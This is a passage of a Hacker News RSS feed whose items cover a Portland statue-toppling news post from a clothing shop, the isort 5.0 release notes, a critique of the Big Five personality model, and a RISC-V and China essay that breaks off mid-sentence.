data-lazy-src="https://mathvault.ca/wp-content/uploads/Graphs-of-Different-Logarithms.png"></p><p id="caption-attachment-6036">Graphs of the logarithmic functions of base $2$, $\displaystyle e$ and $10$. Note that&nbsp;<strong>binary logarithm</strong> attains $1$ when $x=2$, <strong>natural logarithm</strong>&nbsp;when $x=e$ and&nbsp;<strong>common logarithm</strong>&nbsp;only when $x=10$.</p></div><p>In addition to the three most …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mathvault.ca/logarithm-theory/#Properties_of_Logarithm">https://mathvault.ca/logarithm-theory/#Properties_of_Logarithm</a></em></p>]]>
            </description>
            <link>https://mathvault.ca/logarithm-theory/#Properties_of_Logarithm</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740417</guid>
            <pubDate>Sun, 05 Jul 2020 17:45:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[George Washington Statue Toppled by Portland Protesters on the Eve of Juneteenth]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23740401">thread link</a>) | @donald2025
<br/>
July 5, 2020 | https://blacklivesmatter-clothing.com/blogs/news/george-washington-statue-toppled-by-portland-protesters-on-the-eve-of-juneteenth | <a href="https://web.archive.org/web/*/https://blacklivesmatter-clothing.com/blogs/news/george-washington-statue-toppled-by-portland-protesters-on-the-eve-of-juneteenth">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-labelledby="title-0">
  <div>
    <div>
      <div id="shopify-section-article-template">

<div>
  <p>&nbsp;&nbsp;&nbsp;&nbsp; A group of protesters gathered around a statue of George Washington in Portland, Oregon, on Thursday night and lit a fire on its head before pulling it to the ground. Washington, the nation’s first president, owned slaves but later in life began to oppose slavery and in his will ordered that his slaves be freed after his wife’s death.</p>
<p>&nbsp;Protests following Floyd’s death initially focused on the circumstances of his death and concerns about the police investigation, however, demonstrations have grown around the topic of monuments of historical figures.</p>
<p><span>After the founding father’s statue came crashing down, vandals defaced it with graffiti, then left it face-down in Rose City Park before fleeing around 11 p.m., the station reported.</span></p>
<p><span>"Maybe it's time for George Washington to go to a museum or go somewhere else," Johnson said</span></p>
<p><span>Johnson says he saw what happened late last night when the statue came down.<br>"It was not an angry mob, it was just people trying to take down something they did not like," Johnson said.</span></p>

<p><strong>George Washington statue torn down&nbsp;Portland, Thursday night 18, June, 2020</strong></p>
<p><img alt="" src="https://cdn.shopify.com/s/files/1/0402/2131/1132/files/George_Washington_statue_toppled_2048x2048.jpg?v=1592655866"></p>
<p>&nbsp;Activists first focused on monuments of Confederate leaders, who seceded from the union in defense of slavery. Since then, activists have gone on to target other controversial historical figures, such as&nbsp;Christopher Columbus and George Washington.</p>
<p>As of Friday morning, the statue remained on the ground, covered in spray paint. Some of the messages written on the toppled monument included: “BLM,” an acronym for Black Lives Matter; “You’re on native land;” “f— cops;” “white fragility;” and “no good cops.”</p>
<p>&nbsp;On Friday morning, Andy tweeted a video of the toppled statue:&nbsp;</p>

<blockquote>
<p lang="en" dir="ltr">Portland wakes up to see what antifa did overnight. A century old statue of George Washington was toppled &amp; set on fire with an American flag. “White fragility,” “Damn white men” &amp; other messages are written on the moment. On the ground nearby: “Defund white men.” <a href="https://t.co/zjrsZHJC9o">pic.twitter.com/zjrsZHJC9o</a></p>
— Andy Ngô (@MrAndyNgo) <a href="https://twitter.com/MrAndyNgo/status/1273969935497084930?ref_src=twsrc%5Etfw">June 19, 2020</a>
</blockquote>
<blockquote></blockquote>

<p><strong>&nbsp;George Washington statue in Portland toppled, protests continue Portland, June 19, 2020</strong></p>
<p><img src="https://cdn.shopify.com/s/files/1/0402/2131/1132/files/portland_6_2048x2048.jpg?v=1592663423" alt=""></p>
<p><span>A group of people tore down a statue of George Washington that stood on the lawn of the German American Society in Northeast Portland.</span></p>
<p><span><strong>Caesar the 'no drama llama' march protest in Portland Friday, June 19, 2020</strong></span></p>
<p><span>Caesar the 'no drama llama' offers support and love at protestors.&nbsp;Caesar has joined many marches and protests for a variety of groups promoting civil rights and equality and frequent charity events.<br></span></p>
<p><span>Caesar is one of 15 llamas who reside at McCool’s Mystic Llama Farm in Jefferson, Oregon, about 75 miles south of Portland. McCool said, "It was important to him to make the 150-mile round-trip drive with Caesar to lend support and hopefully a calming presence for both protesters and police officers."</span></p>
<p><img alt="" src="https://cdn.shopify.com/s/files/1/0402/2131/1132/files/portland_protests_2_2048x2048.jpg?v=1592654519"></p>
<p>&nbsp;Zane Sparling <strong>tweeted</strong>: "<span>George Washington statue in Portland will be removed by crane TODAY and put in storage. No long term decisions made regarding reinstallation."</span></p>
<p>&nbsp;Just spoke with the Regional Arts &amp; Culture Council.&nbsp;</p>
<blockquote>
<div lang="en" dir="ltr"><p>George Washington statue in Portland will be removed by crane TODAY and put in storage. No long term decisions made regarding reinstallation. </p><p>Spokeswoman for RACC says statue caused “harm” <a href="https://t.co/7S0wQUY68y">pic.twitter.com/7S0wQUY68y</a></p></div>
— Zane Sparling (@PDXzane) <a href="https://twitter.com/PDXzane/status/1274044114779009025?ref_src=twsrc%5Etfw">June 19, 2020</a>
</blockquote>
<blockquote></blockquote>
<p>
Matt Rashleigh <strong>tweeted</strong>: "The George Washington statue on NE Sandy in #Portland #Oregon has been pulled down and vandalized. Portland Police officers inspected the damage.&nbsp;<span><span>Someone left a note and a few dollars on it next to the spray painted bronze"</span></span></p><blockquote>
<p lang="en" dir="ltr">The George Washington statue on NE Sandy in <a href="https://twitter.com/hashtag/Portland?src=hash&amp;ref_src=twsrc%5Etfw">#Portland</a> <a href="https://twitter.com/hashtag/Oregon?src=hash&amp;ref_src=twsrc%5Etfw">#Oregon</a> has been pulled down and vandalized. Portland Police officers inspected the damage. Someone left a note and a few dollars on it next to the spray painted bronze. <a href="https://twitter.com/hashtag/koin6news?src=hash&amp;ref_src=twsrc%5Etfw">#koin6news</a> <a href="https://t.co/e5LYbDtvMa">pic.twitter.com/e5LYbDtvMa</a></p>
— Matt Rashleigh (@Matt_KOIN) <a href="https://twitter.com/Matt_KOIN/status/1273885631949594624?ref_src=twsrc%5Etfw">June 19, 2020</a>
</blockquote>

<p><span>Images from the scene show the statue lying face down on the ground and covered in graffiti that read: ‘Genocidal colonist’</span></p>
<p><span>A spokeswoman for the Regional Arts &amp; Culture Council — the nonprofit tasked with maintaining local public art — said a city crew would remove the statue by end of day Friday, June 19, for storage. No final decision about reinstallation has been made.</span></p>
<p><img src="https://cdn.shopify.com/s/files/1/0402/2131/1132/files/The_George_Washington_incident_1024x1024.jpg?v=1593956279" width="1024x1024" height="1024x1024"></p>
<h3><span>Support #BlackLivesMatter movement and get your&nbsp;<span><a href="https://blacklivesmatter-clothing.com/">"I CAN'T BREATHE" T-Shirt</a></span>, We're donating a percentage of every purchase to support&nbsp;</span></h3>
</div>


  <!-- /snippets/social-sharing.liquid -->







</div>
    </div>
  </div>
</article></div>]]>
            </description>
            <link>https://blacklivesmatter-clothing.com/blogs/news/george-washington-statue-toppled-by-portland-protesters-on-the-eve-of-juneteenth</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740401</guid>
            <pubDate>Sun, 05 Jul 2020 17:42:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Utility ISort 5.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23740400">thread link</a>) | @throwaway333444
<br/>
July 5, 2020 | https://timothycrosley.github.io/isort/docs/major_releases/introducing_isort_5/ | <a href="https://web.archive.org/web/*/https://timothycrosley.github.io/isort/docs/major_releases/introducing_isort_5/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        
      
      
      <main role="main">
        <div data-md-component="container">
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                  <a href="https://github.com/timothycrosley/isort/edit/develop/docs/major_releases/introducing_isort_5.md" title="Edit this page"></a>
                
                
                
<p><a href="https://timothycrosley.github.io/isort/"><img alt="isort 5 - the best version of isort yet" src="https://raw.githubusercontent.com/timothycrosley/isort/develop/art/logo_5.png"></a></p>
<p>isort 5.0.0 is the first major release of isort in over five years and the first significant refactoring of isort since it was conceived more than ten years ago.
It's also the first version to require Python 3 (Python 3.6+ at that!) to run - though it can still be run on source files from any version of Python.
This does mean that there may be some pain with the upgrade process, but we believe the improvements will be well worth it.</p>
<p><a href="https://timothycrosley.github.io/isort/CHANGELOG/">Click here for an attempt at full changelog with a list of breaking changes.</a></p>
<p><a href="https://timothycrosley.github.io/isort/docs/quick_start/0.-try/">Try isort 5 right now from your browser!</a></p>
<p>So why the massive change?</p>

<div><pre><span></span><code><span>isort --profile black .</span>
<span>isort --profile django .</span>
<span>isort --profile pycharm .</span>
<span>isort --profile google .</span>
<span>isort --profile open_stack .</span>
<span>isort --profile plone .</span>
<span>isort --profile attrs .</span>
<span>isort --profile hug .</span>
</code></pre></div>


<p>isort is very configurable. That's great, but it can be overwhelming, both for users and for the isort project. isort now comes with profiles for the most common isort configurations,
so you likely will not need to configure anything at all. This also means that as a project, isort can run extensive tests against these specific profiles to ensure nothing breaks over time.</p>

<div><pre><span></span><code><span>import</span> <span>a</span>  <span># &lt;- These are sorted</span>
<span>import</span> <span>b</span>

<span>b</span><span>.</span><span>install</span><span>(</span><span>a</span><span>)</span>

<span>import</span> <span>os</span>  <span># &lt;- And these are sorted</span>
<span>import</span> <span>sys</span>


<span>def</span> <span>my_function</span><span>():</span>
    <span>import</span> <span>x</span>  <span># &lt;- Even these are sorted!</span>
    <span>import</span> <span>z</span>
</code></pre></div>


<p>isort 5 will find and sort contiguous section of imports no matter where they are.
It also allows you to place code in-between imports without any hacks required.</p>




<p>isort has been refactored to use a streaming architecture. This means it can sort files of <em>any</em> size (even larger than the Python interpreter supports!) without breaking a sweat.
It also means that even when sorting imports in smaller files, it is faster and more resource-efficient.</p>

<p>Sorting the same file with the same configuration should give you the same output no matter what computer or OS you are running. Extensive effort has been placed around refactoring
how modules are placed and how configuration files are loaded to ensure this is the case.</p>

<div><pre><span></span><code><span>cimport</span> <span>ctime</span>
<span>from</span> <span>cpython</span> <span>cimport</span> <span>PyLong_FromVoidPtr</span>
<span>from</span> <span>cpython</span> <span>cimport</span> <span>bool</span> <span>as</span> <span>py_bool</span>
<span>from</span> <span>cython.operator</span> <span>cimport</span> <span>dereference</span> <span>as</span> <span>deref</span>
<span>from</span> <span>cython.operator</span> <span>cimport</span> <span>preincrement</span> <span>as</span> <span>preinc</span>
<span>from</span> <span>libc.stdint</span> <span>cimport</span> <span>uint64_t</span><span>,</span> <span>uintptr_t</span>
<span>from</span> <span>libc.stdlib</span> <span>cimport</span> <span>atoi</span><span>,</span> <span>calloc</span><span>,</span> <span>free</span><span>,</span> <span>malloc</span>
<span>from</span> <span>libc.string</span> <span>cimport</span> <span>memcpy</span><span>,</span> <span>strlen</span>
<span>from</span> <span>libcpp</span> <span>cimport</span> <span>bool</span> <span>as</span> <span>cpp_bool</span>
<span>from</span> <span>libcpp.map</span> <span>cimport</span> <span>map</span> <span>as</span> <span>cpp_map</span>
<span>from</span> <span>libcpp.pair</span> <span>cimport</span> <span>pair</span> <span>as</span> <span>cpp_pair</span>
<span>from</span> <span>libcpp.string</span> <span>cimport</span> <span>string</span> <span>as</span> <span>cpp_string</span>
<span>from</span> <span>libcpp.vector</span> <span>cimport</span> <span>vector</span> <span>as</span> <span>cpp_vector</span>
<span>from</span> <span>multimap</span> <span>cimport</span> <span>multimap</span> <span>as</span> <span>cpp_multimap</span>
<span>from</span> <span>wstring</span> <span>cimport</span> <span>wstring</span> <span>as</span> <span>cpp_wstring</span>
</code></pre></div>


<p>isort 5 adds seamless support for Cython (<code>.pyx</code>) files.</p>

<div><pre><span></span><code><span>import</span> <span>e</span>
<span>import</span> <span>f</span>

<span># isort: off  &lt;- Turns isort parsing off</span>

<span>import</span> <span>b</span>
<span>import</span> <span>a</span>

<span># isort: on  &lt;- Turns isort parsing back on</span>

<span>import</span> <span>c</span>
<span>import</span> <span>d</span>
</code></pre></div>


<p>isort 5 adds support for <a href="https://timothycrosley.github.io/isort/docs/configuration/action_comments/">Action Comments</a> which provide a quick and convient way to control the flow of parsing within single source files.</p>

<div><pre><span></span><code><span>import</span> <span>isort</span>

<span>isort</span><span>.</span><span>code</span><span>(</span><span>"""</span>
<span>import b</span>
<span>import a</span>
<span>"""</span><span>)</span> <span>==</span> <span>"""</span>
<span>import a</span>
<span>import b</span>
<span>"""</span>
</code></pre></div>


<p>isort now exposes its programmatic API as a first-class citizen. This API makes it easy to extend or use isort in your own Python project. You can see the full documentation for this new API <a href="https://timothycrosley.github.io/isort/reference/isort/api/">here</a>.</p>

<p>A major focus for the release was to give isort a solid foundation for the next 5-10 years of the project's life.
isort has been refactored into functional components that are easily testable. The project now has 100% code coverage.
It utilizes tools like <a href="https://hypothesis.readthedocs.io/en/latest/">Hypothesis</a> to reduce the number of unexpected errors.
It went from fully dynamic to fully static typing using mypy. Finally, it utilizes the latest linters both on (like <a href="https://deepsource.io/gh/timothycrosley/isort/">DeepSource</a>) and offline (like <a href="https://flake8.pycqa.org/en/latest/">Flake8</a>) to help ensure a higher bar for all code contributions into the future.</p>

<p><a href="https://timothycrosley.github.io/isort/docs/quick_start/0.-try/">Try isort 5 right now from your browser!</a></p>
<p>OR</p>
<p>Install isort locally using <code>pip3 install isort</code>.</p>
<p><a href="https://timothycrosley.github.io/isort/docs/quick_start/1.-install/">Click here for full installation instructions.</a></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        

      
    </div></div>]]>
            </description>
            <link>https://timothycrosley.github.io/isort/docs/major_releases/introducing_isort_5/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740400</guid>
            <pubDate>Sun, 05 Jul 2020 17:42:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ongoing Accomplishment of the Big Five]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740367">thread link</a>) | @elsewhen
<br/>
July 5, 2020 | https://carcinisation.com/2020/07/04/the-ongoing-accomplishment-of-the-big-five/ | <a href="https://web.archive.org/web/*/https://carcinisation.com/2020/07/04/the-ongoing-accomplishment-of-the-big-five/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-732">
	<!-- .entry-header -->

	
	
	<div>
		
<p><em>by a literal banana</em></p>
<p>I have been trying to understand the “<a href="https://en.wikipedia.org/wiki/Lexical_hypothesis" target="_blank" rel="noopener">lexical hypothesis</a>” of personality, and its modern descendant, the <a href="https://en.wikipedia.org/wiki/Big_Five_personality_traits" target="_blank" rel="noopener">Five Factor Model of personality</a>, for <a href="https://carcinisation.com/2020/01/27/ignorance-a-skilled-practice/">several</a> <a href="https://carcinisation.com/2020/06/24/the-extended-sniff-test/">months</a>. In that time, I have said some provocative things about the Big Five, and even some unkind things that I admit were unbecoming to a banana. Here, I wish to situate the Five Factor Model in the context of its historical development and modern use, and to demonstrate to the reader the surprising accomplishment that it represents for the field of psychology.<span id="more-732"></span></p>
<p>In personality research, the “lexical hypothesis” refers to a hypothesis attributed to Francis Galton (1884). Galton supposed that each human language would reflect important realities of human character within that language and culture. In particular, he noted that the words used to evaluate character and personality are very numerous (he estimated over a thousand, using a thesaurus), and often overlap in meaning.</p>
<p>But Galton immediately left his thesaurus behind, readily admitting of the impossibility of <a href="https://carcinisation.com/2020/06/26/words-fail/">defining</a> any aspect of character. Rather, he turned to experimental means of testing the character in various ways, and insisted that <em>no particular map or model of personality is needed to start from</em>.</p>
<p>Nowhere in his essay does Galton propose surveys as a means for studying character. He would probably regard such methods as unscientific, as indicated in his final paragraph:</p>
<blockquote><p>[C]haracter ought to be measured by carefully recorded acts, representative of the usual conduct. An ordinary generalisation is nothing more than a muddle of vague memories of inexact observations. It is an easy vice to generalise. We want lists of facts, every one of which may be separately verified, valued and revalued, and the whole accurately summed. It is the statistics of each man’s conduct in small every-day affairs, that will probably be found to give the simplest and most precise measure of his character.</p></blockquote>
<p>The methods that Galton proposed are exclusively non-linguistic. For instance, he commented that observing children involved in play quickly gives one an idea of each child’s emotional expression. Galton’s proposed methods prefigure both hidden camera prank shows and Goffman’s “breaching experiments:”</p>
<blockquote><p>I will not attempt to describe particular games of children or of others, nor to suggest experiments, more or less comic, that might be secretly made to elicit the manifestations we seek, as many such will occur to ingenious persons. They exist in abundance, and I feel sure that if two or three experimenters were to act zealously and judiciously together as secret accomplices, they would soon collect abundant statistics of conduct. They would gradually simplify their test conditions and extend their scope, learning to probe character more quickly and from more of its sides.</p></blockquote>
<p>Other methods Galton expressed enthusiasm for include heart rate measurement (he wore a home-brew heart-rate-measuring apparatus while he delivered the lecture that makes up the text) and methods discoverable from personal context (giving an example from Benjamin Franklin, of a man with one attractive and one deformed leg, who kept track of which leg his interlocutors paid attention to, as a gauge of their optimism or pessimism). Galton would be surprised, I think, to find that the most promising and scientific theory of personality in the twenty-first century is premised entirely on survey responses as its “facts.”</p>
<p>Early in the study of personality, there was a major shift of meaning in the lexical hypothesis. At first, the thesaurus and the word list were its tools of study (e.g., Allport &amp; Odbert, 1936); the idea was to find common factors of meaning in the words themselves. Of course, there is no particularly scientific way to decide how much the word “annoying” is the same as “obnoxious,” or how much either is the same as “low-status.” The major shift was to begin to measure the correlations of an entirely different construct: the correlations of the words <em>when used to describe a particular person</em>. That is, rather than trying to measure the underlying meaning of words, researchers began to measure the degree to which different words were applied to the same person. “Sameness” and “correlation” were no longer distinguishable concepts for the methods.</p>
<p>Initially, lists of adjectives, and eventually, short survey questions, were administered to subjects, who described either a person they knew or themselves. When the responses were subjected to factor analysis—a mathematical analysis to reveal the structure of correlations between responses—a varying number of factors emerged, depending on the methods and the researchers and the questions and the subjects, and these factors were given varying names. Since the early 1990s, the Five Factor Model has been dominant, although the names of the factors vary somewhat even today. The acronym OCEAN is used for the traits: Openness to experience (sometimes called “intellect” or “imagination” or “open-mindedness”), Conscientiousness, Extraversion (sometimes called “surgency”), Agreeableness, and Neuroticism (sometimes called “negative emotionality” or “emotional stability” reversed).<span>&nbsp;</span></p>
<p>Today, the five traits are measured with various survey instruments, with five questions on the shortest version (one for each aspect) and sixty questions on a common long-form version (that used by Soto, 2019). Survey instruments are validated in a number of ways: how much their responses correlate between testings (test-retest reliability, with astrological sign as the gold standard), how much different raters agree using the criteria (inter-rater reliability), and a nebulous concept of construct validity, which sometimes includes scientific gestures designed to ensure that the instrument measures what it purports to measure. Many papers present elaborate numerical artifacts of validation, and I have found that some characterize the validity of their instruments as “good” without providing an indication of what would be “not good enough.” From a brief review of dozens of validated instruments in social psychology, it seems to me that it is relatively easy to “validate” meaningless instruments. As long as the mathematical bona fides are present, the construct need not be meaningful in other ways. (The reader who is rightly suspicious of my broad and unsourced claims may wish to search Google Scholar with variations of “scale,” “inventory,” and “survey instrument,” and examine the results critically. The naming of factors is often a particularly interesting step.)</p>
<p>The strong claim made by advocates of the Five Factor Model is that any set of questions describing a human being, administered to subjects and the responses subjected to factor analysis, will reveal the same five factors (paraphrasing Jordan Peterson in <a href="https://youtu.be/pCceO_D4AlY" target="_blank" rel="noopener">this video</a>, around 11:10-16:40). This strong claim, though dubious in a number of respects, is a major part of the basis for the scientific legitimacy of the Big Five. It is interesting to see which aspects of the strong claim are admitted to be false by advocates of the Big Five, and how much is excused on the grounds that <i>at least it’s something</i>. The Five Factor Model is not perfect, advocates grant, but it is better than nothing. It is not clear how they measure “better than nothing;” this is a potentially interesting hypothesis in need of precisification, perhaps.</p>
<p>The Big Five exist as a special, scientifically validated property of language and survey methods, and that is one basis for their legitimacy. The other basis for the legitimacy of the Five Factor Model is its <i>replicable correlation with consequential life outcomes</i>. We know that the Big Five are not merely phantoms that fall out of a certain analysis of a certain use of language in WEIRD college students, because these traits are reliably correlated with things we care about.<span>&nbsp;</span></p>
<p>One of the most interesting features of the Big Five is the nature of its scientific evidence. Observe what is held out as a “replication” of the theory, and you will discover the theory’s true nature. The most impressive aspect of the ongoing accomplishment of the Five Factor Model is the degree to which it <i>deflects curiosity </i>about its underlying meaning with <i>rituals of scientific validation</i>, regardless of the rituals’ appropriateness in context. Since “replication” is the scientific ritual most recently shown to detect poor science in psychology, being shown to reliably “replicate” is a huge boost to the credibility of a theory.<span>&nbsp;</span></p>
<p>The interesting thing about the Five Factor Model is what it gets away with, in terms of being considered a theory, even though it is not causal, and makes no predictions. What counts as a “replication” of the Five Factor Model, as in Soto (2019), is the following: a correlation is found between one or more factors of the Five Factor Model and some other construct, and that correlation is found again in another sample, regardless of the size of the correlation. In almost all cases, and in 100% of Soto (2019)’s measures, the construct compared to a Big Five factor is derived from an online survey instrument.</p>
<p>What counts as a “consequential life outcome” is also fascinating. In most cases, the life outcome constructs are vague abstractions measured with survey instruments, much like the Big Five themselves. For instance, the life outcome “Inspiration” is measured with the Inspiration Scale, which asks the subject in four ways how often and how deeply inspired they are. Amazingly, this scale correlates a little bit with Extraversion and with Open-mindedness. Do these personality traits “predict” the life outcome of inspiration? Is “Inspiration” as instrumentalized here meaningfully different from the Big Five constructs, such that this correlation is meaningful?<span>&nbsp;</span></p>
<p>Compare the items for the construct “Inspiration” with the items for Extraversion and Open-mindedness used in Soto (2019):</p>
<p><b>Inspiration Scale Items</b></p>
<ul>
<li>I experience inspiration.</li></ul></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://carcinisation.com/2020/07/04/the-ongoing-accomplishment-of-the-big-five/">https://carcinisation.com/2020/07/04/the-ongoing-accomplishment-of-the-big-five/</a></em></p>]]>
            </description>
            <link>https://carcinisation.com/2020/07/04/the-ongoing-accomplishment-of-the-big-five/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740367</guid>
            <pubDate>Sun, 05 Jul 2020 17:36:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RISC-V, China, Nightingales]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740272">thread link</a>) | @ceohockey60
<br/>
July 5, 2020 | https://interconnected.blog/riscv-china-nightingales/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/riscv-china-nightingales/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared 